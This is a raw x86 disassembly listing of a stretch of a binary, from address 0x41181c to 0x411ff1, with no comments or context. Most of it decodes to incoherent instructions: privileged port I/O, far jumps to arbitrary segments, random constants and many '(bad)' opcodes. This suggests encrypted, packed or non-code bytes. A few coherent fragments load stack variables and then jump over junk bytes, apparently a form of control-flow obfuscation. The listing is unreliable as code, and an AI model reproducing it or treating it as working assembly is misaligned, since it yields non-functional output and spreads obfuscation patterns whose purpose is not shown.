  41181c:	xor    DWORD PTR [edx-0x2026119f],ebx
  411822:	imul   esp,edi,0xffffffaf
  411825:	sbb    ebx,eax
  411827:	jo     0x411894
  411829:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41182a:	cmp    ebx,DWORD PTR [ebp+0x1a9171e8]
  411830:	sbb    ch,BYTE PTR [edi-0x3f]
  411833:	icebp  
  411834:	test   al,0x24
  411836:	jmp    0x411828
  411838:	mov    ebx,0xbbe4f287
  41183d:	adc    BYTE PTR [edi-0x21225fca],cl
  411843:	or     edi,DWORD PTR [eax]
  411845:	add    BYTE PTR [ebx-0x2bbd1ce3],ch
  41184b:	sti    
  41184c:	inc    edx
  41184d:	nop
  41184e:	leave  
  41184f:	xchg   ebp,eax
  411850:	add    DWORD PTR [eax],edx
  411852:	aad    0xf4
  411854:	out    0x57,al
  411856:	xor    ah,BYTE PTR [ebp+0x40]
  411859:	mov    al,0x6
  41185b:	mov    eax,0x492c6b11
  411860:	(bad)  
  411861:	mov    cs,WORD PTR [edx+0xb]
  411864:	dec    edx
  411865:	cs mov dh,0xd
  411868:	push   cs
  411869:	outs   dx,DWORD PTR ds:[esi]
  41186a:	jmp    0xf92f:0xc9a86110
  411871:	pop    ecx
  411872:	out    dx,al
  411873:	add    eax,0xb342bcf7
  411878:	xchg   DWORD PTR [eax+0x6847ee7b],eax
  41187e:	adc    eax,0x8e0d515b
  411883:	jo     0x4118e9
  411885:	rol    DWORD PTR [ecx-0x2a],0x80
  411889:	inc    esp
  41188a:	cli    
  41188b:	mov    BYTE PTR [ebp+0x65],dl
  41188e:	sbb    DWORD PTR [edx+eiz*4-0x8ca9e99],ebx
  411895:	retf   
  411896:	fadd   DWORD PTR [edx-0x2385108c]
  41189c:	(bad)  
  41189e:	add    eax,0x56464710
  4118a3:	call   0x4e:0xcacc45c7
  4118aa:	add    cl,ch
  4118ac:	xlat   BYTE PTR ds:[ebx]
  4118ad:	add    BYTE PTR [eax],al
  4118af:	add    BYTE PTR [ebp+0x12],ch
  4118b2:	push   ecx
  4118b3:	js     0x411934
  4118b5:	jnp    0x411924
  4118b7:	pop    ss
  4118b8:	in     al,dx
  4118b9:	outs   dx,DWORD PTR ds:[esi]
  4118ba:	or     BYTE PTR [esi+0x4],0x71
  4118be:	nop
  4118bf:	fisubr WORD PTR [ecx-0x40]
  4118c2:	add    BYTE PTR [eax],al
  4118c4:	mov    edi,0xb0000000
  4118c9:	push   ss
  4118ca:	xor    bh,BYTE PTR [edi-0x14b80167]
  4118d0:	mov    ch,0xf9
  4118d2:	mov    DWORD PTR [edx-0x72],esi
  4118d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118d6:	test   DWORD PTR [eax-0x67],ebx
  4118d9:	mov    ah,0x9c
  4118db:	jno    0x4118f9
  4118dd:	or     eax,0xebeeb32b
  4118e2:	arpl   WORD PTR [edi+0x53f7e689],bx
  4118e8:	sbb    BYTE PTR [ebx-0x76],cl
  4118eb:	dec    ebp
  4118ec:	add    esi,DWORD PTR [esi-0x5e]
  4118ef:	call   esi
  4118f1:	imul   edx,esi,0x522bdca0
  4118f7:	loope  0x41196e
  4118f9:	mov    esp,0xa5b03037
  4118fe:	outs   dx,BYTE PTR ds:[esi]
  4118ff:	jne    0x411936
  411901:	xor    cl,BYTE PTR [edx]
  411903:	cmp    ch,BYTE PTR [ebp+eiz*4-0x41]
  411907:	mov    esp,0xd18e72db
  41190c:	push   ds
  41190d:	or     esp,DWORD PTR [ebx]
  41190f:	adc    DWORD PTR [ebx-0x115bbfa8],esi
  411915:	clc    
  411916:	call   0x90780be7
  41191b:	dec    ebx
  41191c:	scas   al,BYTE PTR es:[edi]
  41191d:	call   0x2bcb:0xe1889e29
  411924:	inc    ebp
  411925:	fistp  DWORD PTR [edi+0x5bf965a6]
  41192b:	mov    edx,fs
  41192d:	sub    DWORD PTR [ebx+eax*2-0x69],esp
  411931:	out    dx,al
  411932:	pop    esi
  411933:	sbb    eax,0x9bfd8466
  411938:	aad    0x59
  41193a:	ins    BYTE PTR es:[edi],dx
  41193b:	loope  0x41197f
  41193d:	or     al,0xcb
  41193f:	aas    
  411940:	aam    0x7a
  411942:	(bad)  
  411943:	mov    ds:0x6afe61af,al
  411948:	(bad)  
  411949:	sbb    eax,0xcd9a9d95
  41194e:	mov    bl,0x21
  411950:	mov    eax,ds:0x24ca4a5f
  411955:	mov    ebp,0x1e6304d7
  41195a:	and    dl,al
  41195c:	jg     0x41196c
  41195e:	push   edx
  41195f:	std    
  411960:	mov    ds:0x457c612e,al
  411965:	leave  
  411966:	mov    ds:0x1b70289f,eax
  41196b:	xchg   esi,eax
  41196c:	mov    ebx,0xd3bf68a5
  411971:	dec    edx
  411972:	mov    cl,0xfb
  411974:	daa    
  411975:	adc    eax,ecx
  411977:	jns    0x411995
  411979:	outs   dx,DWORD PTR ds:[esi]
  41197a:	push   edx
  41197b:	in     eax,0x2
  41197d:	pop    esp
  41197e:	inc    edi
  41197f:	hlt    
  411980:	rcl    DWORD PTR [ebx+0x5c],1
  411983:	and    dh,BYTE PTR [edx-0x56]
  411986:	popa   
  411987:	mov    DWORD PTR [ebp-0x3c],0x14d4
  41198e:	mov    eax,DWORD PTR [ebp-0x48]
  411991:	jmp    0x411a6d
  411996:	add    al,0x8d
  411998:	sub    DWORD PTR [edx-0x77],0xbbefef6e
  41199f:	dec    edi
  4119a0:	ror    ch,1
  4119a2:	out    dx,al
  4119a3:	xchg   ecx,eax
  4119a4:	sti    
  4119a5:	xor    ebp,DWORD PTR [eax]
  4119a7:	rol    DWORD PTR [eax],0x0
  4119aa:	mov    edi,0x52000000
  4119af:	xor    DWORD PTR [ebx],ebx
  4119b1:	clc    
  4119b2:	leave  
  4119b3:	imul   ebx,DWORD PTR [eax-0x27],0xffffffd3
  4119b7:	or     esi,0xffffffd5
  4119ba:	jge    0x4119af
  4119bc:	cmp    DWORD PTR [ebx],eax
  4119be:	or     dh,BYTE PTR [edx]
  4119c0:	fisubr WORD PTR [ecx+0x2de05d7f]
  4119c6:	test   BYTE PTR [edx],dl
  4119c8:	shl    ecx,1
  4119ca:	mov    dl,0xc5
  4119cc:	adc    DWORD PTR [ecx+0x1c],ebx
  4119cf:	dec    BYTE PTR [edi-0x1e7e4b9e]
  4119d5:	push   eax
  4119d6:	add    DWORD PTR [ecx-0x53efae20],esp
  4119dc:	jns    0x411990
  4119de:	sub    bl,0x7b
  4119e1:	jmp    0x41197f
  4119e3:	xlat   BYTE PTR ds:[ebx]
  4119e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119e5:	jmp    0x4b7399a
  4119ea:	mov    al,BYTE PTR [edi]
  4119ec:	dec    ecx
  4119ed:	in     eax,0xaa
  4119ef:	mov    edi,0x134dd8ec
  4119f4:	inc    ebp
  4119f5:	stc    
  4119f6:	stos   BYTE PTR es:[edi],al
  4119f7:	push   ebx
  4119f8:	rcr    DWORD PTR [ecx],1
  4119fa:	(bad)  
  4119fb:	outs   dx,DWORD PTR ds:[esi]
  4119fc:	sbb    eax,0x5daf2758
  411a01:	fmul   DWORD PTR [esi]
  411a03:	dec    edx
  411a04:	clc    
  411a05:	xor    al,0xaa
  411a07:	mov    bl,0xa8
  411a09:	rcr    DWORD PTR [edx-0x743b5037],0x4c
  411a10:	pop    eax
  411a11:	push   ecx
  411a12:	cmc    
  411a13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a14:	mov    cl,0xc8
  411a16:	jb     0x411a5d
  411a18:	call   0x22f51d62
  411a1d:	mov    ds:0x4b3d4d77,al
  411a22:	add    ebx,DWORD PTR [ebx-0x2881332d]
  411a28:	inc    esi
  411a29:	icebp  
  411a2a:	scas   al,BYTE PTR es:[edi]
  411a2b:	fsub   DWORD PTR [edx]
  411a2d:	add    eax,0x8dd53400
  411a32:	inc    esi
  411a33:	mul    BYTE PTR [edi-0x4053c61f]
  411a39:	xor    dh,BYTE PTR cs:[eax-0x7f]
  411a3d:	jo     0x411a47
  411a3f:	sbb    DWORD PTR ds:0x16e154f0,ebp
  411a45:	mov    ch,0x4c
  411a47:	fbstp  TBYTE PTR ds:0x89d80036
  411a4d:	rol    DWORD PTR [ebx-0x256dbae3],0x28
  411a54:	and    eax,0x6299c40a
  411a59:	mov    bh,0xd5
  411a5b:	sbb    BYTE PTR [esi-0x414878dd],bh
  411a61:	jl     0x411a67
  411a63:	dec    eax
  411a64:	dec    eax
  411a65:	scas   eax,DWORD PTR es:[edi]
  411a66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a67:	mov    WORD PTR [edx+0x6c],cs
  411a6a:	add    BYTE PTR gs:[esi],dh
  411a6d:	mov    ecx,0x2c2
  411a72:	jmp    0x411b4e
  411a77:	jle    0x411a5f
  411a79:	dec    BYTE PTR [esi+edi*8+0x5c]
  411a7d:	(bad)  
  411a7e:	idiv   BYTE PTR [eax]
  411a80:	ror    BYTE PTR [esi+0x18d44de],1
  411a86:	mov    eax,ds:0xc1e7
  411a8b:	mov    edi,0xa1000000
  411a90:	pop    edx
  411a91:	and    al,0xd1
  411a93:	push   edi
  411a94:	dec    edx
  411a95:	inc    BYTE PTR [ebx-0xd]
  411a98:	sbb    eax,0xc6a013
  411a9d:	adc    DWORD PTR [edi],edi
  411a9f:	jne    0x411aa4
  411aa1:	jmp    0x499d82ef
  411aa6:	dec    eax
  411aa7:	mov    eax,ds:0xfa549cd5
  411aac:	cmp    eax,0x5699307c
  411ab1:	inc    edi
  411ab2:	dec    esi
  411ab3:	mov    dh,0xf2
  411ab5:	inc    esi
  411ab6:	ret    
  411ab7:	mov    edi,0xd754901
  411abc:	in     eax,0x80
  411abe:	push   edx
  411abf:	adc    esi,DWORD PTR [eax+0x72c336d1]
  411ac5:	adc    al,0x6a
  411ac7:	dec    esp
  411ac8:	mov    ds:0xaf6fed22,eax
  411acd:	xchg   esi,eax
  411ace:	dec    ebp
  411acf:	mov    dl,0x9
  411ad1:	xchg   edi,eax
  411ad2:	dec    ecx
  411ad3:	push   ss
  411ad4:	std    
  411ad5:	sub    esi,DWORD PTR [esi-0x26359eab]
  411adb:	lods   al,BYTE PTR ds:[esi]
  411adc:	ror    DWORD PTR [edx+0x34b71dfc],1
  411ae2:	das    
  411ae3:	into   
  411ae4:	mov    ds:0x924dbb09,eax
  411ae9:	adc    DWORD PTR [ebx-0x6d],0x197ae742
  411af0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411af1:	mov    ch,0xe1
  411af3:	enter  0xb7bb,0xe9
  411af7:	sub    al,0x6f
  411af9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411afa:	stos   BYTE PTR es:[edi],al
  411afb:	mov    esp,0x20193591
  411b00:	mov    edx,0xbdd0f95a
  411b05:	push   es
  411b06:	out    0x9d,eax
  411b08:	mov    WORD PTR [esi-0x5da26e86],?
  411b0e:	cdq    
  411b0f:	inc    ecx
  411b10:	jne    0x411b48
  411b12:	mov    al,0xa8
  411b14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b15:	dec    ebx
  411b16:	mov    bh,0xf5
  411b18:	cld    
  411b19:	test   eax,0x534e7a05
  411b1e:	call   0x21be0252
  411b23:	mov    eax,0x329043f7
  411b28:	stos   DWORD PTR es:[edi],eax
  411b29:	add    ebp,edi
  411b2b:	ins    DWORD PTR es:[edi],dx
  411b2c:	(bad)  
  411b2d:	in     eax,dx
  411b2e:	dec    ebx
  411b2f:	gs (bad) 
  411b31:	out    dx,al
  411b32:	cdq    
  411b33:	jb     0x411b85
  411b35:	sbb    BYTE PTR [eax-0x46ecd902],bl
  411b3b:	aaa    
  411b3c:	lds    eax,FWORD PTR [eax]
  411b3e:	cli    
  411b3f:	icebp  
  411b40:	inc    edi
  411b41:	sbb    cl,BYTE PTR [ebp+0x3434334a]
  411b47:	push   es
  411b48:	in     al,dx
  411b49:	mov    DWORD PTR [ebx+0x2b999247],ebx
  411b4f:	enter  0x458b,0xbc
  411b53:	xor    ecx,eax
  411b55:	mov    eax,DWORD PTR [ebp-0x40]
  411b58:	jmp    0x411c34
  411b5d:	ins    BYTE PTR es:[edi],dx
  411b5e:	retf   
  411b5f:	rol    bl,0xe7
  411b62:	retf   
  411b63:	outs   dx,DWORD PTR ds:[esi]
  411b64:	out    dx,eax
  411b65:	xchg   DWORD PTR [ecx+0x2c1ccd17],ebp
  411b6b:	cmp    eax,ebx
  411b6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b6e:	ret    0x0
  411b71:	mov    edi,0xb000000
  411b76:	retf   0xe221
  411b79:	lahf   
  411b7a:	add    al,0xb4
  411b7c:	push   esi
  411b7d:	cmp    esi,DWORD PTR [edx]
  411b7f:	jo     0x411b05
  411b81:	cmp    ch,BYTE PTR [ecx-0x7b3deffc]
  411b87:	call   0x88c74916
  411b8c:	test   DWORD PTR [ecx-0x5d],0xc6d7cc8
  411b93:	sub    DWORD PTR [edx-0x42],0xffffffb6
  411b97:	pop    esi
  411b98:	mov    edx,0x8a8ce3c7
  411b9d:	out    0xb3,al
  411b9f:	cmp    al,0x47
  411ba1:	sti    
  411ba2:	mov    eax,0x3b12c5e5
  411ba7:	jmp    ebx
  411ba9:	and    cl,BYTE PTR [esi-0x58]
  411bac:	push   0xffffffee
  411bae:	push   esi
  411baf:	push   0xcc71a88f
  411bb4:	int3   
  411bb5:	repz inc eax
  411bb7:	enter  0x64f7,0x50
  411bbb:	pop    ds
  411bbc:	dec    edi
  411bbd:	fwait
  411bbe:	pop    esp
  411bbf:	test   DWORD PTR gs:[edx+0x69],eax
  411bc3:	or     eax,0x8f5d0cc4
  411bc8:	(bad)  
  411bc9:	jmp    DWORD PTR [edi+0x6b]
  411bcc:	push   esi
  411bcd:	dec    esp
  411bce:	inc    ecx
  411bcf:	push   ecx
  411bd0:	out    0x7f,al
  411bd2:	inc    ebx
  411bd3:	inc    esp
  411bd4:	add    edi,DWORD PTR [esi]
  411bd6:	in     eax,0xd8
  411bd8:	ins    DWORD PTR es:[edi],dx
  411bd9:	repz cmp ebp,esi
  411bdc:	or     esi,DWORD PTR [ecx]
  411bde:	push   edx
  411bdf:	inc    edx
  411be0:	outs   dx,DWORD PTR ds:[esi]
  411be1:	dec    ebx
  411be2:	outs   dx,DWORD PTR ds:[esi]
  411be3:	aam    0x5f
  411be5:	jnp    0x411bd3
  411be7:	xchg   edi,eax
  411be8:	xchg   esi,eax
  411be9:	ss sahf 
  411beb:	jnp    0x411c0a
  411bed:	jo     0x411c6e
  411bef:	ficomp DWORD PTR [ecx-0x7f]
  411bf2:	push   ss
  411bf3:	or     ah,BYTE PTR [ecx+0x54456dc0]
  411bf9:	aam    0x5a
  411bfb:	mov    ebp,edi
  411bfd:	(bad)  
  411bfe:	(bad)  
  411c00:	mov    esi,0x56404aea
  411c05:	xor    cl,ch
  411c07:	ins    BYTE PTR es:[edi],dx
  411c08:	pop    esp
  411c09:	loop   0x411bfd
  411c0b:	xor    al,0x0
  411c0d:	cmp    eax,0xfa6dc1eb
  411c12:	xchg   ecx,eax
  411c13:	jnp    0x411bfc
  411c15:	fiadd  DWORD PTR [ebx*4+0x2e7c0098]
  411c1c:	mov    ebp,0x80e29984
  411c21:	ss fisubr WORD PTR gs:[ebp-0x5866d46a]
  411c29:	retf   0xc9c1
  411c2c:	mov    eax,ds:0xa3bb583d
  411c31:	jns    0x411ca9
  411c33:	xor    DWORD PTR [ecx+0x630de1],eax
  411c39:	add    BYTE PTR [ecx+0x3140e9],al
  411c3f:	add    cl,ch
  411c41:	xlat   BYTE PTR ds:[ebx]
  411c42:	add    BYTE PTR [eax],al
  411c44:	add    BYTE PTR [ecx+esi*8+0x6b],dl
  411c48:	pop    edx
  411c49:	out    dx,eax
  411c4a:	fidiv  DWORD PTR [ebp-0x1]
  411c4d:	ss sti 
  411c4f:	push   ebx
  411c50:	aas    
  411c51:	aam    0xac
  411c53:	xor    al,0x5f
  411c55:	gs ret 
  411c57:	add    BYTE PTR [eax],al
  411c59:	mov    edi,0x6b000000
  411c5e:	bound  ecx,QWORD PTR [eax-0x59]
  411c61:	add    bh,dl
  411c63:	or     eax,0xcda22e2
  411c68:	clc    
  411c69:	nop
  411c6a:	jmp    0x571a:0xc3e8352a
  411c71:	je     0x411c88
  411c73:	mov    edx,0xb5b4144a
  411c78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c79:	popf   
  411c7a:	xor    BYTE PTR [ebp-0x4b],cl
  411c7d:	pop    ecx
  411c7e:	push   esi
  411c7f:	ins    DWORD PTR es:[edi],dx
  411c80:	ins    DWORD PTR es:[edi],dx
  411c81:	fwait
  411c82:	pop    es
  411c83:	shl    BYTE PTR [edx+0x624dea33],cl
  411c89:	dec    DWORD PTR [edi-0x20]
  411c8c:	or     DWORD PTR [edi+0x74],esi
  411c8f:	pop    ebp
  411c90:	xor    al,BYTE PTR [ebp+0x5c]
  411c93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c94:	(bad)  [ebp+0x6570b09]
  411c9a:	(bad)  
  411c9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c9c:	push   edx
  411c9d:	mov    eax,0xa8870c26
  411ca2:	outs   dx,DWORD PTR ds:[esi]
  411ca3:	jge    0x411cd0
  411ca5:	shl    DWORD PTR [edx],0x3e
  411ca8:	sti    
  411ca9:	call   0x116b000b
  411cae:	icebp  
  411caf:	and    dh,0x4e
  411cb2:	rcl    DWORD PTR [ecx],0xf8
  411cb5:	ror    BYTE PTR [eax],1
  411cb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cb8:	mov    ecx,0x676fc829
  411cbd:	in     al,0xdf
  411cbf:	cmp    esp,DWORD PTR [ebp+eiz*2-0x47f2ae49]
  411cc6:	add    eax,0x5220d5ce
  411ccb:	ins    BYTE PTR es:[edi],dx
  411ccc:	enter  0xab35,0xf9
  411cd0:	jg     0x411c75
  411cd2:	push   eax
  411cd3:	pop    esp
  411cd4:	add    BYTE PTR [edi-0x2fd7c3cb],cl
  411cda:	lods   al,BYTE PTR ds:[esi]
  411cdb:	mov    cl,0x13
  411cdd:	aam    0xb4
  411cdf:	rcr    BYTE PTR [esi+eax*2+0x4a1e58d6],1
  411ce6:	dec    esi
  411ce7:	bound  esp,QWORD PTR [ecx+0x5a]
  411cea:	xchg   esi,eax
  411ceb:	dec    ecx
  411cec:	pop    ebx
  411ced:	inc    edx
  411cee:	in     eax,dx
  411cef:	rcl    DWORD PTR [eax+0x76],0xf7
  411cf3:	in     eax,0x76
  411cf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cf6:	jnp    0x411d58
  411cf8:	add    dl,BYTE PTR [ebx+edx*4]
  411cfb:	pop    es
  411cfc:	xchg   ebx,eax
  411cfd:	jmp    0x2cd6:0xe0a67e20
  411d04:	imul   ebx,DWORD PTR [ecx-0x4c],0x3a268803
  411d0b:	adc    bh,BYTE PTR [ebp+esi*8-0x7819f590]
  411d12:	fnstsw WORD PTR [ebx+0xf26727f]
  411d18:	test   BYTE PTR [eax-0x7a],dl
  411d1b:	pop    es
  411d1c:	imul   ecx,eax
  411d1f:	mov    eax,DWORD PTR [ebp-0x3c]
  411d22:	mov    edx,DWORD PTR [ebp-0x34]
  411d25:	or     eax,0x13eb
  411d2a:	xor    eax,edx
  411d2c:	add    eax,DWORD PTR [ebp-0x2c]
  411d2f:	mov    edx,DWORD PTR [ebp-0x4]
  411d32:	xor    eax,0xffffef7d
  411d37:	jmp    0x411e13
  411d3c:	loopne 0x411cce
  411d3e:	mov    ch,0x9f
  411d40:	cmc    
  411d41:	mov    edi,0x9c3effea
  411d46:	fwait
  411d47:	xor    ecx,eax
  411d49:	push   0x1
  411d4b:	add    ah,BYTE PTR [esp+eax*8]
  411d4e:	add    BYTE PTR [eax],al
  411d50:	mov    edi,0x68000000
  411d55:	mov    WORD PTR [esp+ecx*2+0x2ba24c58],cs
  411d5c:	outs   dx,BYTE PTR ds:[esi]
  411d5d:	xor    esp,edi
  411d5f:	or     esi,DWORD PTR ds:0xa1032abb
  411d65:	mov    esi,0x708081da
  411d6a:	enter  0x9aaa,0xb5
  411d6e:	fst    DWORD PTR [edi-0x4c460765]
  411d74:	lock mul BYTE PTR [ebx-0x6e]
  411d78:	xchg   ebp,eax
  411d79:	pop    edi
  411d7a:	inc    ebx
  411d7b:	ret    0xf6a3
  411d7e:	dec    edx
  411d7f:	loope  0x411db3
  411d81:	aaa    
  411d82:	inc    ebx
  411d83:	fwait
  411d84:	adc    BYTE PTR [eax],bh
  411d86:	adc    al,0x73
  411d88:	or     cl,0xf5
  411d8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d8c:	hlt    
  411d8d:	(bad)  
  411d8e:	jnp    0x411d9c
  411d90:	ror    DWORD PTR [eax+0x55863007],0x40
  411d97:	cmp    edx,DWORD PTR [ebx-0xe]
  411d9a:	call   0x9fa0:0x10f329e1
  411da1:	mov    ah,0x5
  411da3:	cmp    DWORD PTR [esi+0x9],ebp
  411da6:	enter  0x3927,0x73
  411daa:	push   edi
  411dab:	fstp   TBYTE PTR [ebp+eiz*8-0x7097f9f1]
  411db2:	cmp    eax,0x4677799f
  411db7:	(bad)  
  411db9:	adc    DWORD PTR [eax+esi*1+0xfe2bd94],ecx
  411dc0:	mov    ecx,0x456f70dd
  411dc5:	imul   esp,DWORD PTR [ebp+0xc],0xc14fa9a
  411dcc:	fstp   st(6)
  411dce:	pop    ebp
  411dcf:	in     al,0xc4
  411dd1:	mov    ch,0xb4
  411dd3:	repz push ss
  411dd5:	mov    eax,0x5adf33bb
  411dda:	push   0xffffffb4
  411ddc:	mov    ebp,0x3ceb6df3
  411de1:	in     al,0x3
  411de3:	stc    
  411de4:	repz loope 0x411e57
  411de7:	mov    ah,0xc8
  411de9:	bound  ebp,QWORD PTR [esi]
  411deb:	jge    0x411e44
  411ded:	(bad)  
  411dee:	cld    
  411def:	in     al,0x86
  411df1:	pushf  
  411df2:	jle    0x411ddc
  411df4:	mov    dl,0xa1
  411df6:	outs   dx,DWORD PTR ds:[esi]
  411df7:	push   sp
  411df9:	not    BYTE PTR [ebx]
  411dfb:	jmp    0xc04f50be
  411e00:	lds    esi,FWORD PTR [ebx]
  411e02:	shl    ecx,1
  411e04:	arpl   WORD PTR [eax],di
  411e06:	daa    
  411e07:	arpl   WORD PTR [ecx-0x7c],sp
  411e0a:	xor    eax,0x3d4ca7bb
  411e0f:	aaa    
  411e10:	xchg   edx,eax
  411e11:	sub    DWORD PTR [eiz*1+0x35b6],esp
  411e18:	add    eax,DWORD PTR [ecx+edx*1+0x1323dab4]
  411e1f:	mov    ecx,DWORD PTR [ebp-0x28]
  411e22:	mov    edx,DWORD PTR [ebp-0x24]
  411e25:	imul   ecx,ecx,0x5dae
  411e2b:	sub    ecx,0x7be4
  411e31:	xor    ecx,edx
  411e33:	mov    edx,DWORD PTR [ebp-0x20]
  411e36:	jmp    0x411f12
  411e3b:	dec    edi
  411e3c:	mov    bl,0x93
  411e3e:	xchg   ebx,eax
  411e3f:	push   DWORD PTR [ebx+0x12a6ff4f]
  411e45:	pushf  
  411e46:	aas    
  411e47:	inc    ebp
  411e48:	lahf   
  411e49:	xor    al,0xd
  411e4b:	jecxz  0x411e11
  411e4d:	add    BYTE PTR [eax],al
  411e4f:	mov    edi,0x2a000000
  411e54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e55:	inc    ebp
  411e56:	and    DWORD PTR [ecx-0x8],edi
  411e59:	out    dx,al
  411e5a:	jmp    0xc2d2:0x4022818c
  411e61:	cli    
  411e62:	shr    BYTE PTR [ecx-0x59c402c6],cl
  411e68:	dec    DWORD PTR [eax]
  411e6a:	or     edi,DWORD PTR [edx-0x4f]
  411e6d:	xchg   edx,eax
  411e6e:	or     al,0x2a
  411e70:	xchg   ebx,eax
  411e71:	hlt    
  411e72:	dec    edx
  411e73:	pop    esp
  411e74:	inc    BYTE PTR [ecx-0x3630ddcb]
  411e7a:	mul    DWORD PTR [ebx+0x6ee5cf57]
  411e80:	test   BYTE PTR [ebp-0x4bf916bb],cl
  411e86:	ja     0x411e4e
  411e88:	imul   DWORD PTR [eax]
  411e8a:	push   edx
  411e8b:	sub    al,0xbd
  411e8d:	cmp    eax,0xa7330496
  411e92:	popa   
  411e93:	adc    BYTE PTR [eax+0x456dd45],bh
  411e99:	jae    0x40143374
  411e9f:	call   0x3a7c:0x51574e9a
  411ea6:	and    esp,DWORD PTR [eax+0x24]
  411ea9:	loope  0x411ed2
  411eab:	out    0x6e,al
  411ead:	outs   dx,BYTE PTR ds:[esi]
  411eae:	dec    esp
  411eaf:	js     0x411e8c
  411eb1:	stos   BYTE PTR es:[edi],al
  411eb2:	mov    ds,eax
  411eb4:	test   DWORD PTR [edi],ebx
  411eb6:	nop
  411eb7:	aam    0xbe
  411eb9:	div    DWORD PTR [esi+0x1]
  411ebc:	loopne 0x411f1f
  411ebe:	ins    BYTE PTR es:[edi],dx
  411ebf:	rcl    ah,0x77
  411ec2:	int3   
  411ec3:	cmp    ah,BYTE PTR [eax+0x5c]
  411ec6:	fidiv  WORD PTR [edx-0x7438331]
  411ecc:	xor    al,0x48
  411ece:	jmp    0x31f1:0x44bdd5f0
  411ed5:	cwde   
  411ed6:	(bad)  
  411ed8:	ins    BYTE PTR es:[edi],dx
  411ed9:	imul   eax,DWORD PTR [ecx],0xffffff84
  411edc:	pop    edx
  411edd:	ror    BYTE PTR [esi-0x7889df3b],0x1d
  411ee4:	jl     0x411f05
  411ee6:	xor    DWORD PTR [eax+ebp*2-0x16],0x7f
  411eeb:	mov    edi,DWORD PTR [esi-0x3aa3eef2]
  411ef1:	in     al,0xa
  411ef3:	int3   
  411ef4:	arpl   WORD PTR [esp+ebp*8-0x657601ed],bp
  411efb:	dec    ecx
  411efc:	repnz xor al,0x23
  411eff:	sbb    al,0x12
  411f01:	ds mov bl,0xe2
  411f04:	add    DWORD PTR [eax-0x55],esi
  411f07:	ins    DWORD PTR es:[edi],dx
  411f08:	repnz pop gs
  411f0b:	push   0xc810c447
  411f10:	cmp    esi,DWORD PTR [edi-0x281635f5]
  411f16:	add    BYTE PTR [eax],al
  411f18:	add    BYTE PTR [ebx+eiz*8],ah
  411f1b:	inc    ebx
  411f1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f1d:	(bad)  
  411f1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f1f:	out    0xe3,al
  411f21:	inc    ebp
  411f22:	data16 int 0xa1
  411f25:	pop    ds
  411f26:	inc    edx
  411f27:	neg    DWORD PTR [edi-0x5e]
  411f2a:	lds    eax,FWORD PTR [eax]
  411f2c:	add    BYTE PTR [edi-0x48000000],bh
  411f32:	aam    0x4b
  411f34:	test   esi,ecx
  411f36:	es jns 0x411f1a
  411f39:	xchg   BYTE PTR [eax+ebx*2-0x72365ac0],bh
  411f40:	loopne 0x411ef8
  411f42:	adc    DWORD PTR [eax],ecx
  411f44:	dec    esp
  411f45:	push   edx
  411f46:	xor    al,0x74
  411f48:	out    0x8,al
  411f4a:	inc    ebp
  411f4b:	jg     0x411eea
  411f4d:	sbb    DWORD PTR [ecx+0x177d2af9],ecx
  411f53:	in     al,dx
  411f54:	cmp    BYTE PTR [ecx+0x16c4bef6],dl
  411f5a:	sbb    cl,BYTE PTR [esp+edi*4]
  411f5d:	fwait
  411f5e:	inc    esi
  411f5f:	imul   ecx,eax,0xed22950e
  411f65:	cdq    
  411f66:	aam    0xf
  411f68:	xor    eax,0x6dc04639
  411f6d:	xor    eax,0x80b52feb
  411f72:	rol    ecx,cl
  411f74:	outs   dx,DWORD PTR ds:[esi]
  411f75:	(bad)  
  411f76:	cwde   
  411f77:	(bad)  
  411f78:	cs cmp eax,0x14f74512
  411f7e:	jb     0x411fff
  411f80:	xor    eax,0xaf526d2d
  411f85:	fwait
  411f86:	jo     0x411fc8
  411f88:	add    dh,BYTE PTR [edx+0x61]
  411f8b:	inc    edi
  411f8c:	(bad)  
  411f8d:	(bad)  
  411f8e:	dec    ebx
  411f8f:	arpl   WORD PTR [ebx],bp
  411f91:	pop    ss
  411f92:	sub    al,0xe9
  411f94:	xchg   ebp,eax
  411f95:	retf   
  411f96:	fbstp  TBYTE PTR [eax+ecx*2]
  411f99:	jnp    0x411f36
  411f9b:	and    al,0xff
  411f9d:	mov    ebx,0xb86346a4
  411fa2:	out    0x5a,eax
  411fa4:	adc    DWORD PTR [eax-0x5b53ee8e],esp
  411faa:	jae    0x411f8a
  411fac:	outs   dx,DWORD PTR ds:[esi]
  411fad:	inc    esp
  411fae:	add    al,0xfc
  411fb0:	mov    bl,0xb0
  411fb2:	adc    edi,edx
  411fb4:	shl    BYTE PTR [ecx+0xf],0x5a
  411fb8:	sub    ebx,edx
  411fba:	mov    eax,0x3309fea9
  411fbf:	mov    cl,0xd4
  411fc1:	cmp    eax,0x70c50145
  411fc6:	aaa    
  411fc7:	push   esp
  411fc8:	sar    DWORD PTR [ebx+esi*1],cl
  411fcb:	inc    esp
  411fcc:	xor    bl,0xf5
  411fcf:	mov    ebx,0x4b9a7462
  411fd4:	push   esp
  411fd5:	leave  
  411fd6:	xchg   ecx,eax
  411fd7:	call   0x6fd6:0x26b371b8
  411fde:	push   0xfaea0f33
  411fe3:	push   cs
  411fe4:	jae    0x411fcc
  411fe6:	adc    edx,DWORD PTR [ecx]
  411fe8:	dec    ebp
  411fe9:	cwde   
  411fea:	mov    esi,0x46b433f4
  411fef:	ja     0x411ff4
  411ff1:	enter  0x458b,0x8
